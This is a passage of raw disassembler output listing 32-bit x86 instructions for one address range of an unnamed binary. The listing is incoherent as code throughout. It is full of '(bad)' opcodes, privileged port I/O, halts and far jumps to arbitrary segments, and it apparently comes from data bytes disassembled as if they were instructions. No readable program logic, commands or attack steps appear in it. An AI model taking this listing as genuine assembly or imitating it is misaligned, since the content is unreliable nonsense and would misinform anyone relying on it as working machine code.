  406498:	jl     0x4064dc
  40649a:	scas   al,BYTE PTR es:[edi]
  40649b:	inc    ebx
  40649c:	fucomip st,st(1)
  40649e:	xor    dh,dh
  4064a0:	out    0x12,eax
  4064a2:	push   es
  4064a3:	scas   eax,DWORD PTR es:[edi]
  4064a4:	jb     0x406440
  4064a6:	aaa    
  4064a7:	imul   ecx,esp,0xd9736468
  4064ad:	ror    BYTE PTR [esi+edi*1],cl
  4064b0:	xchg   DWORD PTR [esp+edx*2-0x68],ebp
  4064b4:	pop    esp
  4064b5:	adc    ebx,DWORD PTR [esi]
  4064b7:	into   
  4064b8:	in     al,dx
  4064b9:	pop    esi
  4064ba:	rcl    BYTE PTR [esi+0x13b96b9],0x8
  4064c1:	sub    DWORD PTR [eax-0x698d7fc1],ebx
  4064c7:	mov    eax,ds:0xed4f4059
  4064cc:	sbb    ebp,DWORD PTR [ebp-0x6a4b72f2]
  4064d2:	jo     0x4064c6
  4064d4:	dec    BYTE PTR [edi+0x2071dda5]
  4064da:	shr    esp,cl
  4064dc:	jg     0x4064c9
  4064de:	nop
  4064df:	in     eax,dx
  4064e0:	imul   edi,DWORD PTR [ebp-0x80],0xffffffb5
  4064e4:	xchg   esp,eax
  4064e5:	sub    edx,ecx
  4064e7:	js     0x4064c0
  4064e9:	cld    
  4064ea:	pushf  
  4064eb:	dec    ebx
  4064ec:	loop   0x4064a2
  4064ee:	add    esp,ecx
  4064f0:	js     0x4064bd
  4064f2:	pop    ecx
  4064f3:	inc    edi
  4064f4:	jae    0x4064c2
  4064f6:	push   0xffffffc5
  4064f8:	lea    ebp,[ebp-0x5a]
  4064fb:	enter  0x8c7b,0xba
  4064ff:	ficomp WORD PTR [ecx-0x13ea5908]
  406505:	ret    
  406506:	sti    
  406507:	push   edi
  406508:	inc    esp
  406509:	dec    ebx
  40650a:	mov    edi,0x6558bfe2
  40650f:	ja     0x4064c7
  406511:	cmp    ebx,ebp
  406513:	popf   
  406514:	enter  0x43fd,0x11
  406518:	push   cs
  406519:	repz mov ebx,DWORD PTR [ebx+0x3e5ef110]
  406520:	push   ebp
  406521:	inc    DWORD PTR [ebx-0x6e862307]
  406527:	(bad)  
  406528:	adc    dh,BYTE PTR [ebx+eiz*8-0x284c47a4]
  40652f:	fs loop 0x4064e6
  406532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406533:	mov    DWORD PTR [esi+0xc6e7569],edx
  406539:	out    dx,al
  40653a:	fs sub al,0x6b
  40653d:	std    
  40653e:	xlat   BYTE PTR ds:[ebx]
  40653f:	scas   al,BYTE PTR es:[edi]
  406540:	mov    eax,0x93c84d26
  406545:	ret    0xce6f
  406548:	pop    edx
  406549:	jg     0x40651b
  40654b:	enter  0x15,0x4
  40654f:	fnstsw WORD PTR [eax-0x145a272]
  406555:	shl    al,0x6c
  406558:	sbb    BYTE PTR [edx],0xee
  40655b:	adc    DWORD PTR [ecx+0x24681673],0x42
  406562:	xor    esi,DWORD PTR [eax-0x3642c9e6]
  406568:	pop    ds
  406569:	jno    0x4065df
  40656b:	repz add al,0xa0
  40656e:	pop    edx
  40656f:	push   es
  406570:	sub    dh,BYTE PTR [eax-0xc]
  406573:	enter  0xb25f,0xe9
  406577:	(bad)  
  406578:	xor    al,0xb0
  40657a:	sub    dh,dl
  40657c:	iret   
  40657d:	jae    0x40659d
  40657f:	test   eax,0x4cb44e0d
  406584:	cdq    
  406585:	std    
  406586:	rcl    BYTE PTR [ebx],1
  406588:	in     al,0xca
  40658a:	shr    BYTE PTR [esi-0x1],cl
  40658d:	xchg   eax,edi
  40658f:	pop    esp
  406590:	repnz sub eax,0xb5cff4a3
  406596:	adc    esi,ecx
  406598:	clc    
  406599:	jb     0x4065a6
  40659b:	xchg   edx,eax
  40659c:	mov    ch,0x1d
  40659e:	(bad)  
  40659f:	retf   0x6ff1
  4065a2:	je     0x406593
  4065a4:	fsubr  QWORD PTR [esi+0x3c2013d8]
  4065aa:	mov    ecx,0xdec3f5ca
  4065af:	cmp    bh,ah
  4065b1:	inc    esp
  4065b2:	jo     0x4065c5
  4065b4:	loopne 0x4065e8
  4065b6:	xchg   esp,eax
  4065b7:	and    al,BYTE PTR [edx+eax*2-0x50]
  4065bb:	push   eax
  4065bc:	add    DWORD PTR [ebx-0x52],eax
  4065bf:	jo     0x4065c6
  4065c1:	xchg   BYTE PTR [ebp+0x69],al
  4065c4:	icebp  
  4065c5:	xor    eax,0x930b590a
  4065ca:	sub    DWORD PTR [edi+0x68dbd1cb],esi
  4065d0:	outs   dx,BYTE PTR ds:[esi]
  4065d1:	rcl    DWORD PTR [ecx],cl
  4065d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065d4:	div    BYTE PTR ds:0x66087c9b
  4065da:	ins    BYTE PTR es:[edi],dx
  4065db:	inc    eax
  4065dc:	pop    ss
  4065dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065de:	or     bl,BYTE PTR [ebx+ecx*2]
  4065e1:	and    BYTE PTR [ebx-0x779da25],al
  4065e7:	lahf   
  4065e8:	jmp    0x2a0b868f
  4065ed:	out    dx,al
  4065ee:	mov    al,ds:0x41a814ea
  4065f3:	lods   eax,DWORD PTR ds:[esi]
  4065f4:	imul   edx,ecx,0xffffffa1
  4065f7:	or     DWORD PTR [ecx+0x57],0x65b45dae
  4065fe:	dec    eax
  4065ff:	push   edi
  406600:	jno    0x4065b2
  406602:	aas    
  406603:	fidiv  WORD PTR [edx+0x68]
  406606:	xchg   DWORD PTR [ebx+0x429b8594],ebx
  40660c:	sub    DWORD PTR [eax-0x61],0x4a11a0
  406613:	sub    eax,0x6783b395
  406618:	mov    al,ds:0xc3b58982
  40661d:	jecxz  0x406610
  40661f:	adc    eax,0xaf9006b8
  406624:	(bad)  
  406625:	hlt    
  406626:	and    al,0x9e
  406628:	stos   DWORD PTR es:[edi],eax
  406629:	sbb    BYTE PTR [edi-0x2854091f],bh
  40662f:	ret    
  406630:	(bad)  
  406631:	aad    0xae
  406633:	ins    DWORD PTR es:[edi],dx
  406634:	cmc    
  406635:	push   eax
  406636:	mov    ebx,0x6fc42629
  40663b:	or     cl,BYTE PTR [ebx*1-0x200fa080]
  406642:	cmp    DWORD PTR [ecx],esi
  406644:	add    ecx,DWORD PTR [eax]
  406646:	dec    BYTE PTR [ebx-0x2213442f]
  40664c:	add    dl,bl
  40664e:	jne    0x406617
  406650:	push   eax
  406651:	stos   DWORD PTR es:[edi],eax
  406652:	xor    BYTE PTR [edi*4-0x77ddd3d2],bl
  406659:	into   
  40665a:	add    edx,DWORD PTR [eax-0x4]
  40665d:	cmp    ch,bl
  40665f:	jge    0x4065f5
  406661:	repz aad 0x94
  406664:	mov    dh,0xd8
  406666:	(bad)  
  406667:	xor    ecx,DWORD PTR [edx+0x763546b1]
  40666d:	sti    
  40666e:	and    DWORD PTR [edi+0x63],ebx
  406671:	fist   WORD PTR [ebx-0x27]
  406674:	cdq    
  406675:	ds mov ebp,0xb0955e1b
  40667b:	or     DWORD PTR [edi],ebp
  40667d:	retf   0x75d7
  406680:	or     DWORD PTR [ebp-0x67032cf0],0xcf51d283
  40668a:	out    0xf9,al
  40668c:	pop    ss
  40668d:	push   esp
  40668e:	call   0xbe7c:0xb7694d44
  406695:	cmp    BYTE PTR ds:0x199940dd,ch
  40669b:	sti    
  40669c:	cmp    eax,0xf96bc2d0
  4066a1:	das    
  4066a2:	mov    ebp,0xce4ed6ab
  4066a7:	inc    edx
  4066a8:	cli    
  4066a9:	mov    ebx,0x43a9123d
  4066af:	pop    ss
  4066b0:	icebp  
  4066b1:	test   BYTE PTR [edx],al
  4066b3:	cmp    al,0xf5
  4066b5:	mov    ebp,DWORD PTR [ebp+0x2e]
  4066b8:	test   al,0x7
  4066ba:	scas   eax,DWORD PTR es:[edi]
  4066bb:	jmp    0x40670f
  4066bd:	aas    
  4066be:	leave  
  4066bf:	pop    esp
  4066c0:	and    al,0x9
  4066c2:	jno    0x4066ca
  4066c4:	cmp    ecx,DWORD PTR [edi+0x4e]
  4066c7:	or     al,0x7a
  4066c9:	out    0x8b,al
  4066cb:	ret    0xb676
  4066ce:	nop
  4066cf:	jecxz  0x4066f1
  4066d1:	xchg   edi,eax
  4066d2:	inc    edx
  4066d3:	pop    ebx
  4066d4:	cwde   
  4066d5:	sub    al,0xbb
  4066d7:	pushf  
  4066d8:	add    al,0xf6
  4066da:	mov    eax,ds:0xd17f51c2
  4066df:	cs sbb edi,ebx
  4066e2:	pop    esp
  4066e3:	imul   ebp,DWORD PTR [eax],0x4f
  4066e6:	rol    DWORD PTR [ebx+0x20],1
  4066e9:	adc    al,0x17
  4066eb:	push   es
  4066ec:	dec    ecx
  4066ed:	fld    DWORD PTR [edi]
  4066ef:	mov    eax,edi
  4066f1:	push   0x5d
  4066f3:	mov    dh,0x77
  4066f5:	aas    
  4066f6:	xchg   BYTE PTR [edi-0x3dd99818],bh
  4066fc:	add    BYTE PTR ds:0xe927a467,dh
  406702:	cmp    ch,BYTE PTR [eax+0x50]
  406705:	xor    DWORD PTR [edi+ebp*4-0x51],0x766a7651
  40670d:	ins    BYTE PTR es:[edi],dx
  40670e:	xchg   DWORD PTR [edi+0x5d9ac75d],ebx
  406714:	test   DWORD PTR [ecx-0x4e],esp
  406717:	or     dh,dl
  406719:	test   al,0xaa
  40671b:	fs add eax,0x5ef25cdb
  406721:	mov    eax,ds:0x1dc8b1fa
  406726:	pop    eax
  406727:	hlt    
  406728:	xchg   edi,eax
  406729:	(bad)  
  40672a:	adc    ch,BYTE PTR [edi-0x1b]
  40672d:	addr16 rol ebx,1
  406730:	dec    eax
  406731:	mov    ch,0x7c
  406733:	mov    ds,WORD PTR [edx+esi*2+0x5be76cc6]
  40673a:	sbb    al,0x14
  40673c:	push   0x894843fc
  406741:	cwde   
  406742:	lods   eax,DWORD PTR ds:[esi]
  406743:	add    ecx,DWORD PTR [edx-0x13d4640e]
  406749:	lock outs dx,BYTE PTR ds:[esi]
  40674b:	pop    esi
  40674c:	adc    al,0xd7
  40674e:	jae    0x406712
  406750:	sbb    ah,bl
  406752:	aas    
  406753:	mov    ch,0x76
  406755:	ss dec edi
  406757:	sbb    al,BYTE PTR [ebp+eiz*4+0x5821fd4e]
  40675e:	jp     0x4066f7
  406760:	inc    ecx
  406761:	adc    bh,BYTE PTR [eax+0x5c]
  406764:	iret   
  406765:	fidivr WORD PTR [edi]
  406767:	iret   
  406768:	out    0x1c,al
  40676a:	scas   al,BYTE PTR es:[edi]
  40676b:	dec    ebx
  40676c:	(bad)  
  40676d:	icebp  
  40676e:	loopne 0x406793
  406770:	mov    ah,0xf9
  406772:	das    
  406773:	or     DWORD PTR [eax+0xc5bc186],edi
  406779:	push   ebx
  40677a:	call   0x34728834
  40677f:	in     eax,0xc0
  406781:	pusha  
  406782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406783:	rcr    BYTE PTR [ecx],0x76
  406786:	(bad)  [ecx+0x75095bb4]
  40678c:	das    
  40678d:	popf   
  40678e:	pop    ebx
  40678f:	lea    ebp,[esi]
  406791:	push   0xfffffff1
  406793:	mov    ebp,0xda5086ec
  406798:	lods   eax,DWORD PTR ds:[esi]
  406799:	and    eax,0x9dc496a2
  40679e:	push   esp
  40679f:	pushf  
  4067a0:	loope  0x40675e
  4067a2:	or     DWORD PTR [eax+0x2e755d8c],eax
  4067a8:	jno    0x406789
  4067aa:	imul   eax,DWORD PTR [eax],0x5a
  4067ad:	or     BYTE PTR [edi-0x48f584e4],al
  4067b3:	cmp    eax,0xd74887b4
  4067b8:	paddw  mm6,mm0
  4067bb:	cmp    al,0x68
  4067bd:	inc    esp
  4067be:	sub    ch,al
  4067c0:	pushf  
  4067c1:	or     DWORD PTR [ecx-0x7180cb30],esi
  4067c7:	cmp    esi,DWORD PTR [ebp-0x5e02dfe8]
  4067cd:	mov    ah,0x69
  4067cf:	(bad)  
  4067d1:	(bad)  
  4067d2:	cmp    BYTE PTR [eax-0x32],dl
  4067d5:	and    eax,esi
  4067d7:	or     BYTE PTR [edi+0x6c6d1ca0],cl
  4067dd:	fiadd  WORD PTR [esi+0xa1c1319]
  4067e3:	loopne 0x406833
  4067e5:	retf   
  4067e6:	jbe    0x406774
  4067e8:	scas   al,BYTE PTR es:[edi]
  4067e9:	mov    BYTE PTR [edx],al
  4067eb:	pop    ds
  4067ec:	pop    esi
  4067ed:	out    0xcc,eax
  4067ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067f0:	cmp    DWORD PTR [esi-0x1d],0x2
  4067f4:	jmp    0xc3e0:0xa539efb1
  4067fb:	test   DWORD PTR [eax],0xb11a7e32
  406801:	pop    ds
  406802:	or     al,0xbb
  406804:	mov    dl,0x67
  406806:	sbb    ebp,ebx
  406808:	cli    
  406809:	pushf  
  40680a:	retf   0x7453
  40680d:	inc    ebx
  40680e:	jl     0x406822
  406810:	and    BYTE PTR [edi-0x50],dl
  406813:	loopne 0x40683f
  406815:	(bad)  
  406816:	jmp    0x28fbd608
  40681b:	sbb    DWORD PTR [eax-0x49],ecx
  40681e:	adc    al,0xfc
  406820:	add    cl,BYTE PTR [ebx+0x15]
  406823:	mov    WORD PTR gs:[edx],gs
  406826:	cmp    bl,BYTE PTR ds:0x537eb36f
  40682c:	xchg   edx,eax
  40682d:	sbb    esp,DWORD PTR [ebx]
  40682f:	aaa    
  406830:	mov    esi,0x93dc0ee5
  406835:	aaa    
  406836:	in     eax,dx
  406837:	jae    0x40683a
  406839:	fiadd  DWORD PTR [edx]
  40683b:	mov    ebx,0xd50cdd3
  406840:	push   ebx
  406841:	aas    
  406842:	pop    ebp
  406843:	inc    BYTE PTR [ebx]
  406845:	lods   eax,DWORD PTR ds:[esi]
  406846:	call   0x66eea738
  40684b:	or     ecx,DWORD PTR [ebp-0x29c9aa94]
  406851:	mov    al,ds:0x942f999b
  406856:	out    0x5a,al
  406858:	enter  0x5790,0x2d
  40685c:	jp     0x40680e
  40685e:	lds    edi,FWORD PTR [edx+0x637a80b3]
  406864:	inc    esp
  406865:	rcl    BYTE PTR [edx],1
  406867:	pop    ebp
  406868:	push   ebx
  406869:	mov    ebp,0xd5546f9e
  40686e:	push   cs
  40686f:	fistp  WORD PTR [ecx+eiz*4+0x4]
  406873:	adc    dl,BYTE PTR [edi+0x5f]
  406876:	je     0x4067fb
  406878:	outs   dx,DWORD PTR ds:[esi]
  406879:	mov    ecx,ecx
  40687b:	fstp   st(0)
  40687d:	ret    0x6575
  406880:	test   BYTE PTR [ecx+0x29],0x39
  406884:	in     al,dx
  406885:	dec    ebx
  406886:	mov    edi,0x1174add0
  40688b:	pop    eax
  40688c:	pop    ecx
  40688d:	add    DWORD PTR [esp+edi*8-0x58086324],ecx
  406894:	dec    ecx
  406895:	fist   DWORD PTR [ebp+0x7b]
  406898:	ins    BYTE PTR es:[edi],dx
  406899:	push   esi
  40689a:	xchg   esi,eax
  40689b:	ins    BYTE PTR es:[edi],dx
  40689c:	mov    ah,0xfe
  40689e:	gs fwait
  4068a0:	les    esp,FWORD PTR [ebx]
  4068a2:	jmp    0xb7e9fa6a
  4068a7:	xchg   esi,eax
  4068a8:	mov    ebp,0xd8ee4ffb
  4068ad:	jnp    0x4068d5
  4068af:	cli    
  4068b0:	jno    0x40689b
  4068b2:	(bad)  
  4068b3:	and    edx,edi
  4068b5:	stos   DWORD PTR es:[edi],eax
  4068b6:	sub    cl,0x4b
  4068b9:	sbb    ch,dl
  4068bb:	aaa    
  4068bc:	stos   BYTE PTR es:[edi],al
  4068bd:	or     ecx,esp
  4068bf:	ins    BYTE PTR es:[edi],dx
  4068c0:	loopne 0x406918
  4068c2:	ins    BYTE PTR es:[edi],dx
  4068c3:	xchg   esp,eax
  4068c4:	fcmovbe st,st(6)
  4068c6:	in     al,dx
  4068c7:	push   ecx
  4068c8:	setno  BYTE PTR [ebx+esi*1-0x4746a2fe]
  4068d0:	fisubr WORD PTR [edx]
  4068d2:	int3   
  4068d3:	ficomp DWORD PTR [ebx]
  4068d5:	adc    al,0x8b
  4068d7:	repnz or dh,BYTE PTR [ecx+0x7b5afb19]
  4068de:	cmp    dh,bl
  4068e0:	jb     0x40694e
  4068e2:	or     esi,ebx
  4068e4:	out    dx,eax
  4068e5:	retf   
  4068e6:	clc    
  4068e7:	les    esi,FWORD PTR [esi-0x47]
  4068ea:	ret    0xabf8
  4068ed:	mov    cl,dl
  4068ef:	ret    
  4068f0:	mov    cl,0xe9
  4068f2:	retf   
  4068f3:	cmc    
  4068f4:	pop    es
  4068f5:	pop    ecx
  4068f6:	(bad)  
  4068f8:	push   ecx
  4068f9:	pop    ds
  4068fa:	rcl    eax,cl
  4068fc:	adc    al,0xf4
  4068fe:	xchg   esi,eax
  4068ff:	xor    DWORD PTR [ebx+edx*4-0x79],eax
  406903:	push   ebx
  406904:	call   0x1bcc:0xc86cc680
  40690b:	mov    ds:0xdf8e0759,eax
  406910:	repz arpl WORD PTR [edi-0x7d],bx
  406914:	fdiv   DWORD PTR [esi]
  406916:	pop    esi
  406917:	sub    esi,DWORD PTR [esi+0x61]
  40691a:	sub    al,0x8
  40691c:	in     al,dx
  40691d:	ret    
  40691e:	jne    0x40694d
  406920:	xchg   ebx,eax
  406921:	xchg   ebx,eax
  406922:	mov    ds,WORD PTR [ebp+0x402aab55]
  406928:	sbb    eax,0x56174c81
  40692d:	into   
  40692e:	cmc    
  40692f:	cmp    ebp,ecx
  406931:	retf   
  406932:	dec    ebp
  406933:	jnp    0x4068ea
  406935:	(bad)  
  406936:	in     al,0x1e
  406938:	dec    eax
  406939:	cwde   
  40693a:	add    al,0xb0
  40693c:	nop
  40693d:	popa   
  40693e:	pushf  
  40693f:	call   0x8c2e:0x335a3491
  406946:	push   ebp
  406947:	pop    edx
  406948:	fldcw  WORD PTR [esi]
  40694a:	jle    0x4069c9
  40694c:	imul   ebx,DWORD PTR ss:[edx],0xce3217b9
  406953:	adc    ah,BYTE PTR [edi]
  406955:	pop    es
  406956:	jns    0x40694c
  406958:	push   cs
  406959:	and    edi,DWORD PTR [edx]
  40695b:	and    BYTE PTR [edi+0x66],bl
  40695e:	add    al,0x36
  406960:	retf   0xa346
  406963:	jbe    0x4069a8
  406965:	mov    DWORD PTR [eax],edx
  406967:	pop    esp
  406968:	not    DWORD PTR [edi-0x5f]
  40696b:	(bad)  
  40696c:	sti    
  40696d:	outs   dx,DWORD PTR ds:[esi]
  40696e:	and    esi,edx
  406970:	add    eax,0x7851caa4
  406975:	loope  0x40694c
  406977:	cli    
  406978:	fdiv   QWORD PTR [esp+ecx*1+0x2ba619f5]
  40697f:	xchg   esp,eax
  406980:	retf   0xbbe
  406983:	lods   al,BYTE PTR ds:[esi]
  406984:	inc    esp
  406985:	xor    esp,DWORD PTR [esi+0x56]
  406988:	dec    esi
  406989:	cmp    eax,0x8b2981b8
  40698e:	aaa    
  40698f:	aad    0x4c
  406991:	loopne 0x40698f
  406993:	sub    ebp,ebp
  406995:	xchg   esp,eax
  406996:	xlat   BYTE PTR ds:[ebx]
  406997:	pop    edx
  406998:	adc    dh,BYTE PTR ds:0x797bc9f7
  40699e:	je     0x4069af
  4069a0:	xchg   ebp,eax
  4069a1:	push   ecx
  4069a2:	lock xchg ebx,eax
  4069a4:	pop    ebx
  4069a5:	int    0xea
  4069a7:	push   esp
  4069a8:	imul   esi,DWORD PTR [esi],0xffffffee
  4069ab:	pusha  
  4069ac:	xchg   DWORD PTR [edi-0x5c],edx
  4069af:	ret    0x6fd6
  4069b2:	rol    ebx,0x35
  4069b5:	or     al,0xd6
  4069b7:	mov    esp,0x6584d40d
  4069bc:	push   ebp
  4069bd:	mov    eax,ds:0x51d98302
  4069c2:	inc    ecx
  4069c3:	pop    ds
  4069c4:	xor    al,0xde
  4069c6:	das    
  4069c7:	(bad)  
  4069c8:	mov    bh,0xd2
  4069ca:	adc    esi,esi
  4069cc:	lahf   
  4069cd:	mov    ch,0xe6
  4069cf:	mov    ch,0xb3
  4069d1:	jbe    0x40695a
  4069d3:	and    DWORD PTR [ecx+0x7f],eax
  4069d6:	gs push eax
  4069d8:	pop    ds
  4069d9:	dec    edx
  4069da:	jb     0x4069f9
  4069dc:	lods   al,BYTE PTR ds:[esi]
  4069dd:	push   0x3e82222e
  4069e2:	retf   
  4069e3:	sbb    BYTE PTR [ebx+esi*2],0x20
  4069e7:	inc    eax
  4069e8:	(bad)  
  4069ea:	int3   
  4069eb:	and    BYTE PTR [edi+eiz*2+0xf41578c],0xe1
  4069f3:	outs   dx,BYTE PTR ds:[esi]
  4069f4:	dec    edi
  4069f5:	jbe    0x40699f
  4069f7:	pop    ds
  4069f8:	xor    bl,BYTE PTR [ecx]
  4069fa:	fwait
  4069fb:	cdq    
  4069fc:	ja     0x4069db
  4069fe:	or     ebp,DWORD PTR [edi-0x50]
  406a01:	xchg   edx,eax
  406a02:	rcr    DWORD PTR ds:0x201e80e9,1
  406a08:	or     ebx,esp
  406a0a:	rcr    edx,1
  406a0c:	xor    al,0x4b
  406a0e:	push   ss
  406a0f:	jb     0x406a18
  406a11:	cli    
  406a12:	rcl    DWORD PTR [ecx+0x53],1
  406a15:	mov    ah,BYTE PTR [edx+ebx*1+0x70]
  406a19:	dec    ebx
  406a1a:	mov    eax,0xccf2cdf8
  406a1f:	mov    dh,0xe4
  406a21:	test   al,0x14
  406a23:	mov    dl,0x6c
  406a25:	or     bl,ah
  406a27:	mov    ecx,0x3e8a3961
  406a2c:	adc    ebp,esi
  406a2e:	push   cs
  406a2f:	and    al,0x3d
  406a31:	cmp    ebx,DWORD PTR [ecx]
  406a33:	mov    esp,0xd4e1dee5
  406a38:	mov    al,ds:0xfa8da6a6
  406a3d:	std    
  406a3e:	pop    esp
  406a3f:	imul   edi,DWORD PTR [edi-0xe],0x6b5857b2
  406a46:	add    eax,0xa8836270
  406a4b:	inc    esi
  406a4c:	jmp    0x4069da
  406a4e:	adc    eax,0x737734ae
  406a53:	mov    al,ds:0xf08aac57
  406a58:	fidivr DWORD PTR [edi]
  406a5a:	sub    al,0xdb
  406a5c:	in     al,0xf6
  406a5e:	mov    dl,0xa4
  406a60:	nop
  406a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a62:	and    al,0xd7
  406a64:	lea    ecx,[esi-0x26876788]
  406a6a:	iret   
  406a6b:	aad    0x49
  406a6d:	retf   0xd896
  406a70:	xbegin 0xf7ab7545
  406a76:	retf   
  406a77:	jae    0x406a11
  406a79:	xchg   esp,eax
  406a7a:	add    edi,DWORD PTR [eax+0x18]
  406a7d:	cmp    al,0x34
  406a7f:	adc    DWORD PTR [ebp-0x3d2b22f0],ebx
  406a85:	push   0xc8821d53
  406a8a:	div    DWORD PTR [ebx*8+0x652e6f8c]
  406a91:	(bad)  
  406a93:	xchg   esp,eax
  406a94:	outs   dx,DWORD PTR ds:[esi]
  406a95:	jae    0x406aa5
  406a97:	into   
  406a98:	adc    edx,DWORD PTR [edx+0xb]
  406a9b:	mov    cl,0x13
  406a9d:	jg     0x406a41
  406a9f:	mov    DWORD PTR [ebp-0x69558bcf],esi
  406aa5:	cmp    ebp,DWORD PTR [edx+eiz*8+0x1b9a3699]
  406aac:	cmp    DWORD PTR [esi-0x14],edx
  406aaf:	mov    BYTE PTR [edi+edx*1+0x666f8a51],bh
  406ab6:	inc    esp
  406ab7:	xchg   ecx,eax
  406ab8:	inc    esi
  406ab9:	mov    dl,0x81
  406abb:	mov    ecx,0xa218b37d
  406ac0:	ins    DWORD PTR es:[edi],dx
  406ac1:	cld    
  406ac2:	call   0xd3d243da
  406ac7:	push   es
  406ac8:	inc    eax
  406ac9:	clc    
  406aca:	outs   dx,BYTE PTR ds:[esi]
  406acb:	(bad)  
  406acc:	pop    es
  406acd:	mov    eax,ds:0x33304b9c
  406ad2:	cwde   
  406ad3:	pushf  
  406ad4:	popa   
  406ad5:	popa   
  406ad6:	jle    0x406aaf
  406ad8:	push   esi
  406ad9:	cmp    eax,0xf5168f21
  406ade:	cmp    DWORD PTR [edx],esp
  406ae0:	cli    
  406ae1:	aad    0x77
  406ae3:	les    edi,FWORD PTR [esi*4+0x7a034ff1]
  406aea:	mov    ds:0x3a4b2c73,al
  406aef:	adc    esi,DWORD PTR [ebp+0x69]
  406af2:	ret    
  406af3:	and    eax,0xa7a20c54
  406af8:	sti    
  406af9:	inc    eax
  406afa:	cmc    
  406afb:	mov    eax,0xa2881047
  406b00:	stos   BYTE PTR es:[edi],al
  406b01:	(bad)  
  406b02:	enter  0x36ae,0xf3
  406b06:	mov    BYTE PTR [esi],0xb5
  406b09:	jo     0x406b5e
  406b0b:	jge    0x406ace
  406b0d:	std    
  406b0e:	jle    0x406b7a
  406b10:	push   0xffffffe7
  406b12:	push   ebp
  406b13:	push   ebp
  406b14:	push   ecx
  406b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b16:	sbb    ebx,ebp
  406b18:	inc    eax
  406b19:	push   edi
  406b1a:	fnop   
  406b1c:	dec    ecx
  406b1d:	pop    ebx
  406b1e:	mov    eax,0x5f8b9ede
  406b23:	mov    bl,0xad
  406b25:	(bad)  
  406b26:	fbld   TBYTE PTR [edx]
  406b28:	neg    BYTE PTR [ebx+0x515ad701]
  406b2e:	push   cs
  406b2f:	pop    esi
  406b30:	jge    0x406ba0
  406b32:	ins    BYTE PTR es:[edi],dx
  406b33:	push   edx
  406b34:	ror    DWORD PTR [edx],0x25
  406b37:	aas    
  406b38:	sbb    al,0xa9
  406b3a:	jmp    0xf4a5:0x9ec06119
  406b41:	pop    ds
  406b42:	and    ebp,edx
  406b44:	std    
  406b45:	xchg   esi,eax
  406b46:	inc    esi
  406b47:	inc    esp
  406b48:	(bad)  
  406b49:	cdq    
  406b4a:	mov    fs,eax
  406b4c:	retf   
  406b4d:	jae    0x406ba5
  406b4f:	(bad)  
  406b50:	xchg   edx,eax
  406b51:	pop    eax
  406b52:	push   edi
  406b53:	jno    0x406bbe
  406b55:	and    eax,0x56e91490
  406b5a:	mov    al,ds:0x64110b82
  406b5f:	jne    0x406b74
  406b61:	bound  ebx,QWORD PTR [ebx-0x36]
  406b64:	push   eax
  406b65:	cmp    ecx,DWORD PTR [ecx]
  406b67:	push   ds
  406b68:	add    al,0x71
  406b6a:	(bad)  
  406b6c:	mov    ds:0x71f1ba5a,eax
  406b71:	cmp    DWORD PTR [edx-0x359c9c4c],edi
  406b77:	mov    ?,WORD PTR [ebx+edi*4+0x1a]
  406b7b:	inc    edx
  406b7c:	add    ecx,DWORD PTR [edx+0x64]
  406b7f:	pop    ds
  406b80:	stos   BYTE PTR es:[edi],al
  406b81:	ins    DWORD PTR es:[edi],dx
  406b82:	mov    dh,0xfd
  406b84:	sbb    al,dl
  406b86:	out    0xf3,eax
  406b88:	call   0xa2ea:0xc89cb16a
  406b8f:	pusha  
  406b90:	loope  0x406b6c
  406b92:	sti    
  406b93:	mov    BYTE PTR [eax],ch
  406b95:	xchg   dh,al
  406b97:	and    edx,ebx
  406b99:	in     eax,0x33
  406b9b:	int3   
  406b9c:	mov    es,WORD PTR [ebp+0x411a4b56]
  406ba2:	mov    bh,0xc2
  406ba4:	(bad)  
  406ba5:	and    al,0x25
  406ba7:	das    
  406ba8:	push   0x55
  406baa:	cs and sp,bp
  406bae:	xlat   BYTE PTR ds:[ebx]
  406baf:	mov    ?,WORD PTR ds:0xc82023be
  406bb5:	(bad)  
  406bb6:	and    eax,0x8fccc86d
  406bbb:	jp     0x406b80
  406bbd:	jo     0x406bce
  406bbf:	test   eax,0x79b99fff
  406bc4:	or     dh,0xc4
  406bc7:	imul   edx,DWORD PTR [ebp+0x5f],0x6d
  406bcb:	xor    bl,ah
  406bcd:	inc    esi
  406bce:	int3   
  406bcf:	jge    0x406bad
  406bd1:	xchg   ecx,eax
  406bd2:	xlat   BYTE PTR ds:[ebx]
  406bd3:	jge    0x406ba9
  406bd5:	pop    eax
  406bd6:	imul   DWORD PTR [ecx-0x1b1d47c3]
  406bdc:	sub    BYTE PTR [edi],0x91
  406bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406be0:	xor    eax,0xbe234af2
  406be5:	mov    al,ds:0xd7b1298f
  406bea:	cmp    DWORD PTR [edi],esi
  406bec:	lods   eax,DWORD PTR ds:[esi]
  406bed:	enter  0x1800,0x25
  406bf1:	mul    DWORD PTR [ecx-0x24]
  406bf4:	add    eax,0xdf26d59b
  406bf9:	mov    esp,DWORD PTR [esi-0x76]
  406bfc:	idiv   BYTE PTR [ebx]
  406bfe:	in     al,0xc9
  406c00:	push   0x6ffb40d7
  406c05:	mov    ecx,0x7ebc54a4
  406c0a:	outs   dx,BYTE PTR ds:[esi]
  406c0b:	jmp    0x406b8e
  406c0d:	retf   0xc359
  406c10:	pusha  
  406c11:	repz sbb ebx,DWORD PTR [ebp+eax*4+0x339f4226]
  406c19:	imul   edi,DWORD PTR [esi-0x30b68315],0xffffffef
  406c20:	retf   
  406c21:	push   cs
  406c22:	push   ecx
  406c23:	lahf   
  406c24:	rcl    BYTE PTR [ecx+eax*1],cl
  406c27:	sbb    BYTE PTR [edx+0x17],0xdf
  406c2b:	and    al,0x57
  406c2d:	push   esp
  406c2e:	jae    0x406c36
  406c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c31:	jecxz  0x406c7c
  406c33:	push   0xd9125b37
  406c38:	test   DWORD PTR [ecx],ebp
  406c3a:	cld    
  406c3b:	mov    ds:0x5542036d,al
  406c40:	adc    eax,0xdae061f9
  406c45:	xor    al,0xfd
  406c47:	mov    esi,0xa15b36a5
  406c4c:	inc    eax
  406c4d:	(bad)  
  406c4e:	sbb    al,0x3d
